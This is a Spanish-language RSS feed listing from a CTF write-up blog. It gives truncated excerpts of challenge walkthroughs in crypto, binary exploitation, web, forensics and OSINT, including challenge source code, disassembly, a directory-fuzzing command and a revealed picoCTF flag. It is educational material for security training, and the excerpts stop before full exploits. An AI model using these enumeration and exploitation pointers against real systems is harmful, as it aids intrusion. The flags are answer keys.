$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13] Existe una ruta /admin:</description></item><item><title>Model E1337 v2 - Hardened Rolling Code Lock</title><link>https://7rocky.github.io/ctf/hacker101ctf/model-e1337-v2---hardened-rolling-code-lock/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/hacker101ctf/model-e1337-v2---hardened-rolling-code-lock/</guid><description>Este reto está muy relacionado a Model E1337 - Rolling Code Lock, especialmente en la parte de criptoanálisis. Se recomienda leerlo si no se ha hecho antes.
Como en el reto anterior, tenemos una simple página web que solicita un código para desbloquear:
Podemos poner cualquier número y veremos que es incorrecto:
La diferencia con el primer reto es la longitud del número, esta vez es de 64 bits.
Deberíamos de tener el código fuente en Python para realizar el proceso de criptoanálisis.</description></item><item><title>Money Flowz</title><link>https://7rocky.github.io/ctf/htb-challenges/osint/money-flowz/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/osint/money-flowz/</guid><description>Tenemos esta descripción del reto:
Frank Vitalik is a hustler, can you figure out where the money flows?
Reddit Primero, podemos buscar el nombre que tenemos en un motor de búsqueda:
Nos dirigimos a Reddit. Aquí podemos ver algunas publicaciones de Frank Vitalik con algunas estafas:
Y esta es una estafa para conseguir &amp;ldquo;free coinz&amp;rdquo;:
Lo próximo a analizar es una dirección de billetera Ethereum (wallet).
Enumeración de Ethereum Específicamente, debemos ir a una red de pruebas (testnet) de Ethereum llamada Ropsten:</description></item><item><title>Monstrosity</title><link>https://7rocky.github.io/ctf/htb-challenges/osint/monstrosity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/osint/monstrosity/</guid><description>Tenemos esta descripción del reto:
The following social media account is associated with a widespread banking trojan that is silently infecting an increasing number of victims the past few days. There is intense interaction with the aforementioned account right before the self-decryption function of the malicious executable. Investigators around the world are trying to reverse engineer this specific part of the malware with no success so far. Search the account for potential clues that could prove useful.</description></item><item><title>Morse Code</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/morse-code/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/morse-code/</guid><description>Se nos proporciona esta ristra de . y -:
-.-. - ..-. .-.. . .- .-. -. ... .- -- ..- . .-.. -- --- .-. ... . .. ... -.-. --- --- .-.. -... -.-- - .... . .-- .- -.-- .. .-.. .. -.- . -.-. .... . . ... Como sugiere el título del reto, se trata de código Morse. Por tanto, tenemos que decodificarlo.
Esto lo podemos hacer manualmente: -.</description></item><item><title>MSS</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/mss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/mss/</guid><description>Se nos proporciona el código fuente en Python del servidor:
import os, random, json from hashlib import sha256 from Crypto.Util.number import bytes_to_long from Crypto.Cipher import AES from Crypto.Util.Padding import pad from secret import FLAG class MSS: def __init__(self, BITS, d, n): self.d = d self.n = n self.BITS = BITS self.key = bytes_to_long(os.urandom(BITS//8)) self.coeffs = [self.key] + [bytes_to_long(os.urandom(self.BITS//8)) for _ in range(self.d)] def poly(self, x): return sum([self.coeffs[i] * x**i for i in range(self.</description></item><item><title>MSS</title><link>https://7rocky.github.io/ctf/other/htb-unictf/mss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/mss/</guid><description>Se nos proporciona el código fuente en Python del servidor:
import os, random, json from hashlib import sha256 from Crypto.Util.number import bytes_to_long from Crypto.Cipher import AES from Crypto.Util.Padding import pad from secret import FLAG class MSS: def __init__(self, BITS, d, n): self.d = d self.n = n self.BITS = BITS self.key = bytes_to_long(os.urandom(BITS//8)) self.coeffs = [self.key] + [bytes_to_long(os.urandom(self.BITS//8)) for _ in range(self.d)] def poly(self, x): return sum([self.coeffs[i] * x**i for i in range(self.</description></item><item><title>MSS Revenge</title><link>https://7rocky.github.io/ctf/other/htb-unictf/mss-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/mss-revenge/</guid><description>Este reto es el mismo que MSS, pero con una correción para evitar una solución.
Revisión del reto El servidor crea un polinomio con coeficientes aleatorios de 256 bits:
$$ P(x) = \mathrm{key} + a_1 x + a_2 x^2 + \dots + a_{30} x^{30} $$ El objetivo es encontrar $\mathrm{key}$, que se utiliza para derivar una clave de AES para cifrar la flag. El servidor nos permite evaluar el polinomio 19 veces con valores de $0 &amp;lt; x \leqslant 2^{15}$.</description></item><item><title>Multipage Recyclings</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/multipage-recyclings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/multipage-recyclings/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random, os FLAG = b'HTB{??????????????????????}' class CAES: def __init__(self): self.key = os.urandom(16) self.cipher = AES.new(self.key, AES.MODE_ECB) def blockify(self, message, size): return [message[i:i + size] for i in range(0, len(message), size)] def xor(self, a, b): return b''.join([bytes([_a ^ _b]) for _a, _b in zip(a, b)]) def encrypt(self, message): iv = os.urandom(16) ciphertext = b'' plaintext = iv blocks = self.</description></item><item><title>Multipage Recyclings</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/multipage-recyclings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/multipage-recyclings/</guid><description>Se nos proporciona el código fuente del servidor en Python:
from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random, os FLAG = b'HTB{??????????????????????}' class CAES: def __init__(self): self.key = os.urandom(16) self.cipher = AES.new(self.key, AES.MODE_ECB) def blockify(self, message, size): return [message[i:i + size] for i in range(0, len(message), size)] def xor(self, a, b): return b''.join([bytes([_a ^ _b]) for _a, _b in zip(a, b)]) def encrypt(self, message): iv = os.urandom(16) ciphertext = b'' plaintext = iv blocks = self.</description></item><item><title>Mutation Lab</title><link>https://7rocky.github.io/ctf/htb-challenges/web/mutation-lab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/mutation-lab/</guid><description>Se nos proporciona una página web como esta:
Nos tenemos que registrar e iniciar sesión para ver un dashboard chulo:
La única funcionalidad que tenemos es la de exportar las imágenes SVG que vemos como archivos PNG. Podemos capturar la petición con Burp Suite:
Después de un poco de investigación, podemos ver que hay una vulnerabilidad en la conversión de SVG que deriva en lectura de archivos locales (más información en security.</description></item><item><title>nehebkaus trap</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/nehebkaus-trap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/nehebkaus-trap/</guid><description>Se nos proporciona una instancia remota a la que conectarnos:
$ nc 167.71.143.44 32139 __ {00} \__/ /^/ ( ( \_\_____ (_______) (_________()Ooo. [ Nehebkau's Trap ] You are trapped! Can you escape? &amp;gt; Reconocimiento básico Se nos permite ingresar alguna información, pero muestra un error:
&amp;gt; asdf [*] Input accepted! Error: name 'asdf' is not defined El mensaje de error parece familiar para un REPL de Python:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; asdf Traceback (most recent call last): File "</description></item><item><title>Nice netcat...</title><link>https://7rocky.github.io/ctf/picoctf/general-skills/nice-netcat.../</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/general-skills/nice-netcat.../</guid><description>Se nos proporciona un nombre de dominio y un puerto para una instancia remota. Si nos conectamos utilizando nc, nos envía una lista de números:
$ nc mercury.picoctf.net 22902 112 105 99 111 67 84 70 123 103 48 48 100 95 107 49 116 116 121 33 95 110 49 99 51 95 107 49 116 116 121 33 95 100 51 100 102 100 54 100 102 125 10 ^C Estos números parece que son la representación en ASCII decimal de algunos caracteres.</description></item><item><title>Nightmare</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/nightmare/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/nightmare/</guid><description>Se nos proporciona un binario de 64 bits llamado nightmare:
Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Ingeniería inversa Usando Ghidra, podemos leer el código fuente descompilado en C. Esta es la función main:
void main() { char option; int option_char; setup(); do { while (true) { while (true) { menu(); option_char = getchar(); option = (char)option_char; getchar(); if (option != '3') break; puts("</description></item><item><title>No Place To Hide</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/no-place-to-hide/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/no-place-to-hide/</guid><description>Se nos proporcionan estos archivos de log de una sesión RDP en Windows:
$ file Cache0000.bin Cache0000.bin: data $ file bcache24.bmc bcache24.bmc: empty $ du -h Cache0000.bin bcache24.bmc 17M	Cache0000.bin 0B	bcache24.bmc Y esta es la descripción del reto:
We found evidence of a password spray attack against the Domain Controller, and identified a suspicious RDP session. We&amp;rsquo;ll provide you with our RDP logs and other files. Can you see what they were up to?</description></item><item><title>No Return</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/no-return/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/no-return/</guid><description>Se nos proporciona un binario de 64 bits llamado no-return:
Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Ingeniería inversa El binario está compilado estáticamente y es tan pequeño que podemos mostrar el código ensamblador complato aquí:
$ objdump -M intel -d no-return no-return: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 &amp;lt;.text&amp;gt;: 401000: 5c pop rsp 401001: 5f pop rdi 401002: 5e pop rsi 401003: 5d pop rbp 401004: 5a pop rdx 401005: 59 pop rcx 401006: 5b pop rbx 401007: 48 31 c0 xor rax,rax 40100a: ff 67 01 jmp QWORD PTR [rdi+0x1] 40100d: 48 ff c0 inc rax 401010: de f1 fdivrp st(1),st 401012: ff 22 jmp QWORD PTR [rdx] 401014: 48 2b 74 24 10 sub rsi,QWORD PTR [rsp+0x10] 401019: f5 cmc 40101a: ff 22 jmp QWORD PTR [rdx] 40101c: 48 89 e1 mov rcx,rsp 40101f: fd std 401020: ff 22 jmp QWORD PTR [rdx] 401022: 48 8d 0c d9 lea rcx,[rcx+rbx*8] 401026: fd std 401027: ff 21 jmp QWORD PTR [rcx] 401029: 48 31 d5 xor rbp,rdx 40102c: 0f 95 c4 setne ah 40102f: ff a5 00 00 44 e8 jmp QWORD PTR [rbp-0x17bc0000] 401035: 48 01 f4 add rsp,rsi 401038: de f9 fdivp st(1),st 40103a: ff 22 jmp QWORD PTR [rdx] 40103c: 48 01 dd add rbp,rbx 40103f: 9b fwait 401040: ff 65 c7 jmp QWORD PTR [rbp-0x39] 401043: 88 a7 00 00 44 e8 mov BYTE PTR [rdi-0x17bc0000],ah 401049: f9 stc 40104a: ff 22 jmp QWORD PTR [rdx] 40104c: 59 pop rcx 40104d: 48 89 d1 mov rcx,rdx 401050: 5a pop rdx 401051: ff 21 jmp QWORD PTR [rcx] 401053: 48 ff c1 inc rcx 401056: de f1 fdivrp st(1),st 401058: ff 22 jmp QWORD PTR [rdx] 40105a: 48 92 xchg rdx,rax 40105c: de f9 fdivp st(1),st 40105e: ff 21 jmp QWORD PTR [rcx] 401060: 48 ff c3 inc rbx 401063: de f1 fdivrp st(1),st 401065: ff 22 jmp QWORD PTR [rdx] 401067: 48 87 cf xchg rdi,rcx 40106a: fd std 40106b: ff 22 jmp QWORD PTR [rdx] 40106d: 54 push rsp 40106e: 48 31 c0 xor rax,rax 401071: 48 ff c0 inc rax 401074: 48 31 ff xor rdi,rdi 401077: 48 ff c7 inc rdi 40107a: 48 89 e6 mov rsi,rsp 40107d: ba 08 00 00 00 mov edx,0x8 401082: 0f 05 syscall 401084: 48 81 ee b0 00 00 00 sub rsi,0xb0 40108b: 48 31 c0 xor rax,rax 40108e: 48 31 ff xor rdi,rdi 401091: 48 8d 36 lea rsi,[rsi] 401094: ba c0 00 00 00 mov edx,0xc0 401099: 0f 05 syscall 40109b: 48 83 c4 08 add rsp,0x8 40109f: ff 64 24 f8 jmp QWORD PTR [rsp-0x8] Esta vez, el binario está desarrollado solo para ser explotado, no hay ningúna funcionalidad realista.</description></item><item><title>Noisy CRC</title><link>https://7rocky.github.io/ctf/other/sekai-ctf/noisy-crc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/sekai-ctf/noisy-crc/</guid><description>Se nos proporciona el código fuente en Python del servidor:
import secrets from Crypto.Util.number import * from Crypto.Cipher import AES from hashlib import sha256 from flag import FLAG def getCRC16(msg, gen_poly): assert (1 &amp;lt;&amp;lt; 16) &amp;lt;= gen_poly &amp;lt; (1 &amp;lt;&amp;lt; 17) # check if deg = 16 msglen = msg.bit_length() msg &amp;lt;&amp;lt;= 16 for i in range(msglen - 1, -1, -1): if (msg &amp;gt;&amp;gt; (i + 16)) &amp;amp; 1: msg ^= (gen_poly &amp;lt;&amp;lt; i) return msg def oracle(secret, gen_poly): res = [secrets.</description></item><item><title>Noleak</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/noleak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/noleak/</guid><description>Se nos proporciona un binario de 64 bits llamado noleak:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Ingeniería inversa Su código descompilado en C es muy sencillo:
undefined8 _() { undefined8 unaff_RBP; return unaff_RBP; } void FUN_00401060(FILE *param_1, char *param_2, int param_3, size_t param_4) { setvbuf(param_1, param_2, param_3, param_4); } undefined8 vuln() { undefined8 param_10; undefined8 local_12; undefined2 local_a; local_12 = 0; local_a = 0; gets((char *) &amp;amp;local_12); return param_10; } undefined8 main(undefined8 param_1, undefined8 param_2, undefined8 param_3, undefined8 param_4, undefined8 param_5, undefined8 param_6) { FUN_00401060(stdin, 0, 2, 0, param_5, param_6, param_2); FUN_00401060(stdout, 0, 2, 0); FUN_00401060(stderr, 0, 2, 0); vuln(); return 0; } Básicamente, tenemos un programa que usa gets sobre un buffer de 10 bytes (&amp;quot;undefined8 + undefined2&amp;quot;).</description></item><item><title>not crypto</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/not-crypto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/not-crypto/</guid><description>This is the not crypto flag which is totaly not crypto, but crypto! Can we get a clap from the team for excessive crypto usage?
Se nos proporciona el siguiente script de Python:
import base64 input_string = "REMOVED" def secret(raw_string): result = [] for char in raw_string: if 'a' &amp;lt;= char &amp;lt;= 'z': offset = ord('a') result.append(chr(((ord(char) - offset + 13) % 26) + offset)) elif 'A' &amp;lt;= char &amp;lt;= 'Z': offset = ord('A') result.</description></item><item><title>Notepad as a Service</title><link>https://7rocky.github.io/ctf/imaginaryctf/notepad-as-a-service/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/notepad-as-a-service/</guid><description>Se nos proporciona un binario de 64 bits llamado notepad:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Si usamos Ghidra para extraer el código en C descompilado, veremos la función main:
void main() { setbuf(stdout, (char *) 0x0); do { notepad(); } while (true); } Básicamente, ejecuta notepad de forma infinita:
void notepad() { long in_FS_OFFSET; char option; int i; undefined notes[136]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); for (i = 0; i &amp;lt; 128; i = i + 1) { notes[i] = 0; } puts("</description></item><item><title>Nowhere to go</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/nowhere-to-go/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/nowhere-to-go/</guid><description>Se nos proporciona un sistema de archivos comprimido, una imagen de kernel y un script de qemu:
# file * bzImage: Linux kernel x86 boot executable bzImage, version 5.9.16 (buildroot@a7f111e5c8c1) #1 SMP Thu Apr 22 11:04:47 UTC 2021, RO-rootFS, swap_dev 0X8, Normal VGA rootfs.cpio.gz: gzip compressed data, max compression, from Unix, original size modulo 2^32 5115392 run.sh: Bourne-Again shell script, ASCII text executable #!/bin/bash qemu-system-x86_64 \ -m 128M \ -cpu qemu64 \ -nographic \ -monitor /dev/null \ -kernel .</description></item><item><title>Nuclear Sale</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/nuclear-sale/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/nuclear-sale/</guid><description>Se nos proporciona un archivo PCAP (challenge.pcap). Si lo analizamos con Wireshark, veremos unos emails en SMTP:
El reto está basado en una serie de correos enviados en una empresa. Hay información cifrada en ellos. Estos son los emails:
Hello everyone, A potential Buyer approached us asking for a HUGE amount of plutonium. Are we even allowed to sell this much? Best Regards, Sales Dept We are very XORry but the management does not approve such a sale.</description></item><item><title>Obedient Cat</title><link>https://7rocky.github.io/ctf/picoctf/general-skills/obedient-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/general-skills/obedient-cat/</guid><description>En este reto se nos da un archivo. El contenido de este archivo es la flag:
$ cat flag picoCTF{s4n1ty_v3r1f13d_28e8376d}</description></item><item><title>Old Bridge</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/old-bridge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/old-bridge/</guid><description>Se nos proporciona un binario de 64 bits llamado oldbridge:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Tenemos casi todas las protecciones habilitadas, por lo que debemos realizar varios bypasses para explotar el binario.
Ingeniería inversa Como en la mayoría de los retos de explotación de binarios, debemos hacer un paso de ingeniería inversa para obtener las instrucciones de ensamblador o el código fuente en C del binario para determinar qué está haciendo y cómo podemos explotarlo.</description></item><item><title>One Step Closer</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/one-step-closer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/one-step-closer/</guid><description>Se nos proporciona el código fuente en Python para cifrar la flag, y una aplicación Flask que llama a la función de cifrado:
from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrime, inverse import random FLAG = b'HTB{--REDACTED--}' p = getPrime(1024) q = getPrime(1024) n = p * q e = 257 def encrypt_flag(): a = random.getrandbits(1024) b = random.getrandbits(1024) flag = bytes_to_long(FLAG) msg = a*flag + b ct = pow(msg, e, n) return {'ct': format(ct, 'x'), 'n': format(n, 'x'), 'e': format(e, 'x'), 'a': format(a, 'x'), 'b': format(b, 'x')} from flask import * from chall import encrypt_flag app = Flask(__name__) @app.</description></item><item><title>Optimistic</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/optimistic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/optimistic/</guid><description>Se nos proporciona un binario de 64 bits llamado optimistic:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Ingeniería inversa Si usamos Ghidra, veremos el código fuente descompilado en C para la función main:
void main() { int number; ssize_t read_length; uint length; undefined4 local_80; undefined2 local_7c; char option; undefined local_79; undefined email[8]; undefined age[8]; char name[96]; initialize(); puts("Welcome to the positive community!</description></item><item><title>Optimus Prime</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/optimus-prime/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/optimus-prime/</guid><description>Se nos proporciona una instancia remota a la que conectarnos. Tenemos algunas opciones:
$ nc 167.99.202.193 31899 Your people must learn to be masters of their own fate. 1. View status of the Transformer. 2. View Serial ID's of the Transformer. 3. Register new Transformer. 4. Enter to the access panel. Enter the option: 1 Battery: 60% Mechanical damages: 14% Heat: 64.76 ºC Ncat: Broken pipe. $ nc 167.99.202.193 31899 Your volume, like any capability, is also a responsibility.</description></item><item><title>Oracle</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/oracle/</guid><description>Se nos proporciona un binario de 64 bits llamado oracle:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled También tenemos un Dockerfile:
FROM ubuntu:20.04 RUN useradd -m ctf COPY challenge/* /home/ctf/ RUN chown -R ctf:ctf /home/ctf/ WORKDIR /home/ctf USER ctf EXPOSE 9001 CMD ["./run.sh"] Análisis del código fuente Esta vez, se nos proporciona tambiñen el código fuente del programa en C. Es bastante grande, por lo que solo pondré las partes relevantes.</description></item><item><title>Oracle Leaks</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/oracle-leaks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/oracle-leaks/</guid><description>Se nos proporciona el código fuente del servidor en Python:
import os import math from Crypto.Util.number import * from cryptography.hazmat.primitives.asymmetric import rsa def get_length(pt): res = 0 if (len(bin(pt)) - 2) % 8 != 0: res += 1 res += (len(bin(pt)) - 2) // 8 return res def ceil(a, b): return -(-a // b) class RSA: def __init__(self, size): self.e = 0x10001 self.size = size priv = rsa.generate_private_key( public_exponent=self.e, key_size=size ) pub = priv.</description></item><item><title>Orbital</title><link>https://7rocky.github.io/ctf/htb-challenges/web/orbital/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/orbital/</guid><description>Se nos proporciona un sitio web como este:
También tenemos el código fuente en Python.
Análisis del código fuente La aplicación web está construida con Flask. Se puede encontrar una vulnerabilidad clara de inyección SQL (SQLi) en database.py:
from colorama import Cursor from application.util import createJWT, passwordVerify from flask_mysqldb import MySQL mysql = MySQL() def query(query, args=(), one=False): cursor = mysql.connection.cursor() cursor.execute(query, args) rv = [dict((cursor.description[idx][0], value) for idx, value in enumerate(row)) for row in cursor.</description></item><item><title>Orbital</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/orbital/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/orbital/</guid><description>Se nos proporciona un sitio web como este:
También tenemos el código fuente en Python.
Análisis del código fuente La aplicación web está construida con Flask. Se puede encontrar una vulnerabilidad clara de inyección SQL (SQLi) en database.py:
from colorama import Cursor from application.util import createJWT, passwordVerify from flask_mysqldb import MySQL mysql = MySQL() def query(query, args=(), one=False): cursor = mysql.connection.cursor() cursor.execute(query, args) rv = [dict((cursor.description[idx][0], value) for idx, value in enumerate(row)) for row in cursor.</description></item><item><title>Ouija</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/ouija/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/ouija/</guid><description>Se nos proporciona un binario llamado ouija:
$ file ouija ouija: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=53a9e0435f7c7041c557e9d4a8418cb6a916f339, for GNU/Linux 3.2.0, not stripped Ingeniería inversa Si lo abrimos en Ghidra, veremos el código en C descompilado de la función main:
int main() { undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined4 local_60; undefined2 local_5c; undefined local_5a; int key_copy; int r; int m; int o; int n; int q; int p; int l; char *enc_flag; int k; int j; int i; local_78 = 0x6877644b7b544c5a; local_70 = 0x665f6b615f796661; local_68 = 0x6b6d7874675f6c67; local_60 = 0x616c7375; local_5c = 0x6667; local_5a = 0x7d; setvbuf(stdout, NULL, 2, 0); enc_flag = strdup((char *) &amp;amp;local_78); puts("</description></item><item><title>Ouija</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/ouija/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/ouija/</guid><description>Se nos proporciona un binario llamado ouija:
$ file ouija ouija: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2cace162c306a34dcfc4837d648d047e2ea339fe, for GNU/Linux 3.2.0, not stripped Ingeniería inversa Si lo abrimos en Ghidra, veremos el código en C descompilado de la función main:
int main() { int key_copy; int r; int m; int o; int n; int q; int p; int l; char *enc_flag; int k; int j; int i; setvbuf(stdout, NULL, 2, 0); enc_flag = strdup("</description></item><item><title>Oxidized ROP</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/oxidized-rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/oxidized-rop/</guid><description>Tenemos un binario de 64 bits llamado oxidized-rop:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Además, tenemos el código fuente en Rust, por lo que no es necesario realizar ingeniería inversa del binario.
Análisis de código fuente Esta es la función main:
fn main() { print_banner(); let mut feedback = Feedback { statement: [0_u8; INPUT_SIZE], submitted: false, }; let mut login_pin: u32 = 0x11223344; loop { print_menu(); match get_option().</description></item><item><title>Packet Cyclone</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/packet-cyclone/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/packet-cyclone/</guid><description>Tenemos esta descripción del reto:
Pandora&amp;rsquo;s friend and partner, Wade, is the one that leads the investigation into the relic&amp;rsquo;s location. Recently, he noticed some weird traffic coming from his host. That led him to believe that his host was compromised. After a quick investigation, his fear was confirmed. Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase. Pandora believes that the malicious actor used rclone to exfiltrate Wade&amp;rsquo;s research to the cloud.</description></item><item><title>Pandora's Bane</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/pandoras-bane/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/pandoras-bane/</guid><description>Se nos proporciona un volcado de memoria llamado mem.raw:
$ du -h mem.raw 2,1G	mem.raw $ file mem.raw mem.raw: data Análisis de volcado de memoria Usaremos volatility para analizarlo (específicamente, esta imagen de Docker):
$ docker run --rm -v "${PWD}":/project --entrypoint /bin/sh --platform linux/amd64 -it sk4la/volatility3 /usr/local $ cd /project /project $ vol -f mem.raw windows.info.Info | tee info.txt Volatility 3 Framework 2.0.1 Progress: 100.00	PDB scanning finished Variable	Value Kernel Base	0xf80445604000 DTB	0x1ad000 Symbols	file:///usr/local/lib/volatility3/volatility3/symbols/windows/ntkrnlmp.</description></item><item><title>Pandora's Box</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/pandoras-box/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/pandoras-box/</guid><description>Se nos proporciona un binario de 64 bits llamado pb:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Ingeniería inversa Podemos usar Ghidra para analizar el binario y mirar el código fuente descompilado en C:
int main() { setup(); cls(); banner(); box(); return 0; } Entre otras, esta función llama a box:
void box() { long num; char data [32]; data.</description></item><item><title>Paranormial Commitment Scheme</title><link>https://7rocky.github.io/ctf/other/plaid-ctf/paranormial-commitment-scheme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/plaid-ctf/paranormial-commitment-scheme/</guid><description>Se nos proporciona el código fuente en Rust del proyecto que se utiliza para cifrar la flag.
Este es el archivo principal (src/bin/paranormial.rs):
